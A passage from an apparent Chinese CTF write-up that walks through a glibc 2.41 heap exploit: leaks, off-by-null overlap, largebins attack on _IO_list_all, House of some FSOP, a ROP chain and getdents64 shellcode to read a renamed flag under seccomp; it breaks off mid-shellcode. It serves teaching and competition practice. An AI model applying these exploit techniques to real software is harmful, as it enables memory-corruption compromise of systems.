+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">touch(&quot;1111&quot;,0x480)</span><br><span class="line">touch(&quot;2222&quot;,0x480)</span><br><span class="line">touch(&quot;3333&quot;,0x480)</span><br><span class="line">touch(&quot;4444&quot;,0x480)</span><br><span class="line">rm(&quot;1111&quot;)</span><br><span class="line">touch(&quot;1111&quot;,0x480)</span><br><span class="line">cat(&quot;1111&quot;)</span><br><span class="line">base=u64(io.recv(8))-0x210b20</span><br><span class="line">print(hex(base))</span><br><span class="line">rm(&quot;1111&quot;)</span><br><span class="line">rm(&quot;3333&quot;)</span><br><span class="line">touch(&quot;1111&quot;,0x480)</span><br><span class="line">write(&quot;1111&quot;,b&#x27;a&#x27;*8, 8)</span><br><span class="line">cat(&quot;1111&quot;)</span><br><span class="line">io.recvuntil(b&quot;a&quot;*8)</span><br><span class="line">heap=u64(io.recv(8))-0xb00</span><br><span class="line">print(hex(heap))</span><br><span class="line">rm(&quot;1111&quot;)</span><br><span class="line">rm(&quot;2222&quot;)</span><br><span class="line">rm(&quot;4444&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>此时将堆内存恢复到最初没有申请的状态</p>
+<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off-by-null"></a>off-by-null</h3><p>本次libc的版本为2.41, 属于标准的高版本</p>
+<p>2.27以上的off-by-null有着特殊的手法</p>
+<p><img src="/./../images/minivfs/image-20260318210112795.png" alt="image-20260318210112795"></p>
+<p>首先我们要准备ABC三个堆块和一个隔离堆块</p>
+<p>其中B必须复用C的pre_size位 (sizeof(B)以8结尾) </p>
+<p>第一步, 在A中伪造一个fake_chunk , 使得sizeof(fake_chunk)&#x3D;sizeof(A+B)-0x10 (剔除chunk_head_A)</p>
+<p><img src="/./../images/minivfs/image-20260318210609570.png" alt="image-20260318210609570"></p>
+<p>第二步, 编辑B, 在C的pre_size中填上sizeof(fake_chunk), 此时因为off-by-null导致C的pre_inuse位被置零</p>
+<p>此时在ptmalloc2的视角中 : </p>
+<ol>
+<li>C的前一个堆块的大小是fake_chunk , 且前一个堆块处于释放状态</li>
+<li>fake_chunk的前一个堆块处于使用中状态不可合并, 且大小为fake_chunk, 与C的pre_size相符</li>
+</ol>
+<p><img src="/./../images/minivfs/image-20260318210934492.png" alt="image-20260318210934492"></p>
+<p>此时释放C, ptmalloc2会判断前个堆块可合并, 且合并后被放入unsortedbins中</p>
+<p>此时B虽然处于使用中, 但被送入了unsortedbins中</p>
+<p>对应以下操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">touch(&quot;1111&quot;,0x440)</span><br><span class="line">touch(&quot;2222&quot;,0x448)#overlap</span><br><span class="line">touch(&quot;3333&quot;,0x4f0)</span><br><span class="line">touch(&quot;4444&quot;,0x4f0)</span><br><span class="line">touch(&quot;6666666&quot;,0x500)</span><br><span class="line">touch(&quot;7777i7&quot;,0x500)</span><br><span class="line">touch(&quot;888i:88888&quot;,0x430)</span><br><span class="line">touch(&quot;858585858588&quot;,0x4f0)</span><br><span class="line">payload=p64(0)+p64(0x891)+p64(heap+0x2a0)*2</span><br><span class="line">write(&quot;1111&quot;,payload)</span><br><span class="line">payload=b&#x27;a&#x27;*0x440+p64(0x890)</span><br><span class="line">write(&quot;2222&quot;,payload)</span><br><span class="line">rm(&quot;3333&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>此时拥有了以下的效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.</span><br><span class="line">This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c290</span><br><span class="line">Size: 0x450 (with flag bits: 0x451)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c6e0</span><br><span class="line">Size: 0x450 (with flag bits: 0x451)</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55555555cb30</span><br><span class="line">Size: 0x500 (with flag bits: 0x500)</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55555555d030</span><br><span class="line">Size: 0x500 (with flag bits: 0x500)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d530</span><br><span class="line">Size: 0x510 (with flag bits: 0x511)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555da40</span><br><span class="line">Size: 0x510 (with flag bits: 0x511)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555df50</span><br><span class="line">Size: 0x440 (with flag bits: 0x441)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555e390</span><br><span class="line">Size: 0x500 (with flag bits: 0x501)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555e890</span><br><span class="line">Size: 0x1e770 (with flag bits: 0x1e771)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55555555c2a0 —▸ 0x7ffff7e10b20 ◂— 0x55555555c2a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+
+<p>此时虽然形成了堆叠, 但手法仍未结束, 我们<strong>必须</strong>取出包裹中的B , 形成双指针指向B才能真正利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch(&quot;3333&quot;,0x438)</span><br><span class="line">touch(&quot;2222222222222&quot;,0x448)#overlap with 2222</span><br><span class="line">touch(&quot;3333333iiii3&quot;,0x4f0)</span><br></pre></td></tr></table></figure>
+
+<p>此时我们获得了完全重叠的<code>2222</code>和<code>2222222222222</code></p>
+<h3 id="largebins-attack"><a href="#largebins-attack" class="headerlink" title="largebins-attack"></a>largebins-attack</h3><p>因为elf要求我们申请的大小必须在unsorted-bins中</p>
+<p>所以只能使用largebins-attack , 我们可以将堆地址写入<code>_IO_list_all</code>进行<code>FSOP</code></p>
+<p>下面给出<code>how2pwn</code>仓库中<code>largebins-attack</code>的最小poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int main()&#123;</span><br><span class="line">  setvbuf(stdin,NULL,_IONBF,0);</span><br><span class="line">  setvbuf(stdout,NULL,_IONBF,0);</span><br><span class="line">  setvbuf(stderr,NULL,_IONBF,0);</span><br><span class="line">  size_t target = 0;</span><br><span class="line">  size_t *p1 = malloc(0x428);</span><br><span class="line">  size_t *g1 = malloc(0x18);</span><br><span class="line">  size_t *p2 = malloc(0x418);</span><br><span class="line">  size_t *g2 = malloc(0x18);</span><br><span class="line">  free(p1);</span><br><span class="line">  size_t *g3 = malloc(0x438);</span><br><span class="line">  free(p2);</span><br><span class="line">  p1[3] = (size_t)((&amp;target)-4);	// 修改bk_nextsize</span><br><span class="line">  size_t *g4 = malloc(0x438);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们需要先形成一个chunk位于unsortedbins, 一个chunk位于largebins中的状态</p>
+<p>这个很容易实现, 只要unsortedbins中的chunk不符合申请大小便可以从unsortedbins转移到largebins中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rm(&quot;2222&quot;)</span><br><span class="line">rm(&quot;7777i7&quot;)</span><br><span class="line">touch(&quot;7777i7&quot;,0x500)</span><br><span class="line">rm(&quot;888i:88888&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>因为unsortedbins是尾插, 当申请0x510堆块时会从<code>2222</code>开始扫, 导致<code>2222</code>被放入了largebins中, 最后将<code>7777i7</code>申请</p>
+<p>最后再释放<code>888i:88888</code>就形成了预期结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55555555df50 —▸ 0x7ffff7e10b20 ◂— 0x55555555df50</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x440-0x470: 0x55555555c6e0 —▸ 0x7ffff7e10f20 ◂— 0x55555555c6e0</span><br></pre></td></tr></table></figure>
+
+<p>下一步就该 : <strong>将largebins堆块的</strong><code>bk_nextsize</code>指针修改为<code>&lt;target&gt;-0x20</code></p>
+<p>可以通过<code>2222222222222</code>办到这一点, 最后再申请一个同时超过bins中两个堆块大小的堆块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_list_all=base+libc.sym._IO_list_all</span><br><span class="line">payload=b&#x27;a&#x27;*0x18+p64(_IO_list_all-0x20)</span><br><span class="line">write(&quot;2222222222222&quot;,payload)</span><br><span class="line">touch(&quot;888i:88888&quot;,0x500)</span><br></pre></td></tr></table></figure>
+
+<p>以下为部分gdb信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x7ffff7e114c0</span><br><span class="line">00:0000│     0x7ffff7e114c0 (_IO_list_all) —▸ 0x55555555df50 ◂— 0x510</span><br><span class="line">01:0008│     0x7ffff7e114c8 ◂— 0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">04:0020│     0x7ffff7e114e0 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br><span class="line">05:0028│     0x7ffff7e114e8 (_IO_2_1_stderr_+8) —▸ 0x7ffff7e11563 (_IO_2_1_stderr_+131) ◂— 0xe127a00000000000</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c290</span><br><span class="line">Size: 0x450 (with flag bits: 0x451)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c6e0</span><br><span class="line">Size: 0x450 (with flag bits: 0x451)</span><br><span class="line">fd: 0x55555555df50</span><br><span class="line">bk: 0x6161616161616161</span><br><span class="line">fd_nextsize: 0x6161616161616161</span><br><span class="line">bk_nextsize: 0x55555555df50</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55555555cb30</span><br><span class="line">Size: 0x500 (with flag bits: 0x500)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d030</span><br><span class="line">Size: 0x500 (with flag bits: 0x501)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555d530</span><br><span class="line">Size: 0x510 (with flag bits: 0x511)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555da40</span><br><span class="line">Size: 0x510 (with flag bits: 0x511)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x55555555df50</span><br><span class="line">Size: 0x440 (with flag bits: 0x441)</span><br><span class="line">fd: 0x7ffff7e10f20</span><br><span class="line">bk: 0x55555555c6e0</span><br><span class="line">fd_nextsize: 0x55555555c6e0</span><br><span class="line">bk_nextsize: 0x7ffff7e114a0</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>0x55555555df50</code>(<code>888i:88888</code>)被写入了目标</p>
+<p>但是我们没有操作这个堆块的指针, 只需要最后一步, 将这个堆块申请出来, 就可以将<code>2222222222</code>的地址写入<code>_IO_list_all</code>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch(&quot;2222&quot;,0x430)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x7ffff7e114c0</span><br><span class="line">00:0000│     0x7ffff7e114c0 (_IO_list_all) —▸ 0x55555555c6e0 ◂— 0</span><br><span class="line">01:0008│     0x7ffff7e114c8 ◂— 0</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">04:0020│     0x7ffff7e114e0 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br><span class="line">05:0028│     0x7ffff7e114e8 (_IO_2_1_stderr_+8) —▸ 0x7ffff7e11563 (_IO_2_1_stderr_+131) ◂— 0xe127a00000000000</span><br><span class="line">... ↓     2 skipped</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.</span><br><span class="line">This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c290</span><br><span class="line">Size: 0x450 (with flag bits: 0x451)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x55555555c6e0</span><br><span class="line">Size: 0x450 (with flag bits: 0x451)</span><br><span class="line">fd: 0x7ffff7e10f20</span><br><span class="line">bk: 0x6161616161616161</span><br><span class="line">fd_nextsize: 0x6161616161616161</span><br><span class="line">bk_nextsize: 0x7ffff7e114a0</span><br></pre></td></tr></table></figure>
+
+<p>现在我们可以通过<code>3333</code>复用<code>2222222222</code>的pre_size位写入魔术头, 然后伪造其他字段形成完整的结构体</p>
+<h3 id="House-of-some"><a href="#House-of-some" class="headerlink" title="House of some"></a>House of some</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">zer00ne@zer00ne-VMware-Virtual-Platform:~/desktop/SUCTF/work$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x0000003b  if (A == execve) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000142  if (A == execveat) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000038  if (A == clone) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x000001b3  if (A == 0x1b3) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x00000065  if (A == ptrace) goto 0013</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x000000f6  if (A != kexec_load) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
+
+<p>这道题开启了沙箱 , 也就是说必须使用orw</p>
+<p>这就涉及到了ROP</p>
+<p>刚刚好house of some就可以完美解决这个问题 , 详细内容可以看我的另一篇文章 : <a target="_blank" rel="noopener" href="https://khighl.github.io/2025/05/15/house%20of%20some/">house of some</a></p>
+<p>这里就是公式地写出</p>
+<p><code>读IO_FILE</code>(读栈地址) -&gt;<code>写IO_FILE</code>(写入下一个写IO_FILE)-&gt;<code>写IO_FILE</code>劫持read函数的返回地址进行稳定的ROP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">write(&quot;3333&quot;,b&#x27;a&#x27;*0x430+p64(0x800 | 0x1000)[:-1])</span><br><span class="line"></span><br><span class="line">fake1=flat(&#123;</span><br><span class="line">    0x00:p64(0x800 | 0x1000),</span><br><span class="line">    0x20:p64(environ),</span><br><span class="line">    0x28:p64(environ+8),</span><br><span class="line">    0x68:p64(wide),</span><br><span class="line">    0x70:p64(1), </span><br><span class="line">    0x88:p64(heap+0x1000),</span><br><span class="line">    0xd8:p64(_IO_file_jumps)</span><br><span class="line">    &#125;,filler=b&#x27;\x00&#x27;)</span><br><span class="line">fake1=fake1[0x10:]</span><br><span class="line">write(&quot;2222222222222&quot;,fake1)</span><br><span class="line"></span><br><span class="line">fake2=flat(&#123;</span><br><span class="line">    0x38: p64(new),#start</span><br><span class="line">    0x40: p64(new+0x300),#end</span><br><span class="line">    0x68: p64(new),#chain</span><br><span class="line">    0x88: p64(heap+0x1000),</span><br><span class="line">    0xa0: p64(wide+0xd8+8),#wide</span><br><span class="line">    0xc0: p64(2), </span><br><span class="line">    0xd8: p64(_IO_wfile_jumps), </span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br><span class="line">fake3= flat(&#123;</span><br><span class="line">    0xe0: p64(_IO_file_jumps - 0x48),</span><br><span class="line">    0x20: p64(1)</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br><span class="line">write(&quot;2222&quot;,fake2+fake3)</span><br><span class="line">#bug()</span><br><span class="line">io.sendline(b&quot;quit&quot;)</span><br><span class="line">io.recvuntil(b&quot;bye\n&quot;)</span><br><span class="line">stack=u64(io.recv(8))</span><br><span class="line">print(hex(stack))</span><br><span class="line">fake4= fake2=flat(&#123;</span><br><span class="line">    0x38: p64(stack-0x330),#start</span><br><span class="line">    0x40: p64(stack+0x500),#end</span><br><span class="line">    0x88: p64(heap+0x1000),</span><br><span class="line">    0xa0: p64(new+0xd8+8),#wide</span><br><span class="line">    0xc0: p64(2),</span><br><span class="line">    0xd8: p64(_IO_wfile_jumps),</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br><span class="line">fake5= flat(&#123;</span><br><span class="line">    0xe0: p64(_IO_file_jumps - 0x48),</span><br><span class="line">    0x20: p64(1)</span><br><span class="line">&#125;, filler=b&quot;\x00&quot;)</span><br><span class="line">pause()</span><br><span class="line">io.send(fake4+fake5)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
+
+<h3 id="getdents64"><a href="#getdents64" class="headerlink" title="getdents64"></a>getdents64</h3><p>这道题的远程环境有一个小trick</p>
+<p>真flag被重命名为了<code>flag_&lt;hash&gt;</code></p>
+<p>我们没法直接读flag文件, 这就涉及到了一个系统调用<code>getdents64</code> : </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getdents64 是 Linux 内核提供的一个底层系统调用，用于读取目录项（directory entries），也就是列出目录中的文件和子目录。它是 readdir() , system(&quot;ls&quot;)等高级接口在底层的实现基础之一。</span><br></pre></td></tr></table></figure>
+
+<p>也就是说我们可以先打印文件名再进行读文件</p>
+<p>我选择ROP转shellcode, 这样可以精密地操作执行流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ret=base+0x0000000000028882</span><br><span class="line">rdi=base+0x0000000000119e9c</span><br><span class="line">rsi=base+0x000000000011b07d</span><br><span class="line">rdx=base+0x000000000009e68d # pop rdx ; leave ; ret</span><br><span class="line">rbp=base+0x0000000000028a20</span><br><span class="line">rax=base+0x00000000000e4e97</span><br><span class="line">syscall=base+0x000000000009f4a6</span><br><span class="line">payload =p64(ret)*2</span><br><span class="line">payload+=p64(rdi)+p64(stack&amp;~0xfff)+p64(rsi)+p64(0x20000)+p64(rbp)+p64(stack-0x330+0x60)+p64(rdx)+p64(7)</span><br><span class="line">payload+=p64(ret)*0x20</span><br><span class="line">payload+=p64(rax)+p64(10)+p64(syscall)+p64(rdi)+p64(stack-0x330+0x188+0x20)+p64(base+0x000000000006b92e)</span><br><span class="line">payload+=asm(&quot;nop;&quot;*0x200)</span><br></pre></td></tr></table></figure>
+
+<p>关于<code>getdents64</code>直接给出AI生成的板子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">shellcode= f&quot;&quot;&quot;</span><br><span class="line">    /* 第一步：open(&quot;.&quot;, O_RDONLY | O_DIRECTORY) */</span><br><span class="line">    push 0x2e          /* &quot;.&quot; 的 ASCII */</span><br><span class="line">    mov rdi, rsp       /* 路径名指向栈上的 &quot;.&quot; */</span><br><span class="line">    xor rsi, rsi       /* flags = O_RDONLY (0) */</span><br><span class="line">    mov rax, 2         /* SYS_open */</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    /* 保存文件描述符 fd 到 